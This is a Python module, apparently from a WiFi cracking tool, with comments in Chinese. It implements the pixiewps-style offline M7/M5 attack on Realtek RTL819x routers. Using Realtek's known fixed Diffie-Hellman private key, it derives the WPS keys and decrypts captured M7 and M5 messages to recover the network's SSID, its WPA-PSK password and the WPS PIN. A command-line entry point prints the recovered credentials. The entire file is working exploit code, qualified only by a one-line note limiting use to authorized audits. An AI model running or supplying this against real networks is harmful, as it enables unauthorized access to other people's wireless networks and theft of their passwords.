"""M7 加密设置解密 → 离线恢复 WPA-PSK（仅 RTL819x 设备，--mode 3）。

对应 pixiewps 的 --m7-enc / --m5-enc 流程：
  1. DHKey = SHA-256(PKr^A mod p)，A = 0x55*192（Realtek 已知私钥）。
  2. KDK  = HMAC-SHA256(DHKey, E-Nonce || BSSID || R-Nonce)。
  3. kdf(KDK) → AuthKey / KeyWrapKey / EMSK。
  4. AES-128-CBC 解密 M7 加密设置 → 解析 SSID、NET_KEY(WPA-PSK)、E-S2。
  5. 可选解密 M5 → E-S1，配合 E-Hash1/E-Hash2 还原 WPS PIN。

仅限对本人拥有或已获书面授权的网络进行安全审计。
"""

from __future__ import annotations

from typing import Dict, Optional

from .aes import aes_128_cbc_decrypt
from .pixie_dust import (
    WPS_RTL_PKE, RTL_PRIV_KEY, DH_GROUP5_PRIME,
    sha256, hmac_sha256, kdf, hex_to_bytes, _crack,
    WPS_HASH_LEN, WPS_AUTHKEY_LEN, WPS_KEYWRAPKEY_LEN,
)

# WPS TLV 标签（原始 2 字节）
TAG_E_SNONCE_1 = b"\x10\x16"
TAG_E_SNONCE_2 = b"\x10\x17"
TAG_SSID = b"\x10\x45"
TAG_NET_KEY = b"\x10\x27"


def find_vtag(data: bytes, vid: bytes, vlen: int = 0) -> Optional[bytes]:
    """解析 WPS TLV 列表，返回首个匹配 tag 的 data。"""
    pos = 0
    n = len(data)
    while pos + 4 <= n:
        tag_id = data[pos:pos + 2]
        tag_len = int.from_bytes(data[pos + 2:pos + 4], "big")
        if pos + 4 + tag_len > n:
            break
        if tag_id == vid and (vlen == 0 or tag_len == vlen):
            return data[pos + 4:pos + 4 + tag_len]
        pos += 4 + tag_len
    return None


def decrypt_encr_settings(wrapkey: bytes, encr: bytes) -> Optional[bytes]:
    """AES-128-CBC 解密加密设置（IV=前16字节，密文=其余），校验 PKCS#7 填充。"""
    if len(encr) < 32 or len(encr) % 16 != 0:
        return None
    iv = encr[:16]
    ciphertext = encr[16:]
    decrypted = aes_128_cbc_decrypt(wrapkey, iv, ciphertext)
    pad = decrypted[-1]
    if pad == 0 or pad > len(decrypted):
        return None
    if decrypted[-pad:] != bytes([pad]) * pad:
        return None
    return decrypted


def recover_from_m7(
    pkr: str,
    e_nonce: str,
    r_nonce: str,
    e_bssid: str,
    m7_enc: str,
    m5_enc: Optional[str] = None,
    e_hash1: Optional[str] = None,
    e_hash2: Optional[str] = None,
    pke: Optional[str] = None,
) -> Dict:
    """从被动抓取的 M7（及可选 M5）恢复 WPA-PSK / SSID / E-S2 / 可选 PIN。

    返回 dict：{'wpa_psk', 'ssid', 'es1', 'es2', 'pin', ...}，失败返回 {}。
    """
    pkr_b = hex_to_bytes(pkr)
    n1 = hex_to_bytes(e_nonce)
    r1 = hex_to_bytes(r_nonce)
    bssid = hex_to_bytes(e_bssid)
    pke_b = hex_to_bytes(pke) if pke else None

    if pke_b is None or pke_b == WPS_RTL_PKE:
        pke_b = WPS_RTL_PKE
    else:
        # pixiewps 当前仅支持 RTL 固定 PKe 的 M7 解密
        return {"error": "M7 解密仅支持 RTL 设备（PKe == wps_rtl_pke）。"}

    # DHKey = SHA-256(PKr^A mod p)
    a = int.from_bytes(RTL_PRIV_KEY, "big")
    p = int.from_bytes(DH_GROUP5_PRIME, "big")
    dh = pow(int.from_bytes(pkr_b, "big"), a, p)
    dhkey = sha256(dh.to_bytes(192, "big"))

    # KDK 与密钥派生
    kdk = hmac_sha256(dhkey, n1 + bssid + r1)
    derived = kdf(kdk)
    authkey = derived[:WPS_AUTHKEY_LEN]
    wrapkey = derived[WPS_AUTHKEY_LEN:WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN]

    result: Dict = {}

    # 解密 M7
    dec7 = decrypt_encr_settings(wrapkey, hex_to_bytes(m7_enc))
    if dec7 is None:
        return {"error": "M7 解密失败（wrapkey 或数据不匹配）。"}

    ssid = find_vtag(dec7, TAG_SSID)
    netkey = find_vtag(dec7, TAG_NET_KEY)
    es2 = find_vtag(dec7, TAG_E_SNONCE_2, 16)
    if ssid:
        result["ssid"] = ssid.rstrip(b"\x00").decode("utf-8", "replace")
    if netkey:
        result["wpa_psk"] = netkey.rstrip(b"\x00").decode("utf-8", "replace")
    if es2:
        result["es2"] = es2

    # 解密 M5（可选）→ E-S1
    es1 = None
    if m5_enc:
        dec5 = decrypt_encr_settings(wrapkey, hex_to_bytes(m5_enc))
        if dec5 is not None:
            es1 = find_vtag(dec5, TAG_E_SNONCE_1, 16)
            if es1:
                result["es1"] = es1

    # 若提供 E-Hash1/E-Hash2，且能拿到 E-S1/E-S2，则还原 PIN
    if e_hash1 and e_hash2 and es1 and es2:
        h1 = hex_to_bytes(e_hash1)
        h2 = hex_to_bytes(e_hash2)
        empty_psk = hmac_sha256(authkey, b"")
        ok, pin, psk1, psk2 = _crack(authkey, empty_psk, es1, es2, pke_b, pkr_b, h1, h2)
        if ok:
            result["pin"] = pin

    return result


def main(argv=None) -> int:
    import argparse
    ap = argparse.ArgumentParser(description="WCracking — M7 离线恢复 WPA-PSK")
    ap.add_argument("-e", "--pke")
    ap.add_argument("-r", "--pkr", required=True)
    ap.add_argument("-n", "--e-nonce", required=True, dest="e_nonce")
    ap.add_argument("-m", "--r-nonce", required=True, dest="r_nonce")
    ap.add_argument("-b", "--e-bssid", required=True, dest="e_bssid")
    ap.add_argument("-7", "--m7-enc", required=True, dest="m7_enc")
    ap.add_argument("-5", "--m5-enc", dest="m5_enc")
    ap.add_argument("-s", "--e-hash1", dest="e_hash1")
    ap.add_argument("-z", "--e-hash2", dest="e_hash2")
    args = ap.parse_args(argv)

    r = recover_from_m7(
        pke=args.pke, pkr=args.pkr, e_nonce=args.e_nonce, r_nonce=args.r_nonce,
        e_bssid=args.e_bssid, m7_enc=args.m7_enc, m5_enc=args.m5_enc,
        e_hash1=args.e_hash1, e_hash2=args.e_hash2,
    )
    if "error" in r:
        print(f"[-] {r['error']}")
        return 1
    if "ssid" in r:
        print(f"[*] SSID    : {r['ssid']}")
    if "wpa_psk" in r:
        print(f"[+] WPA-PSK : {r['wpa_psk']}")
    if "pin" in r:
        print(f"[+] WPS pin : {r['pin']}")
    if not r:
        print("[-] 未恢复出任何凭据。")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
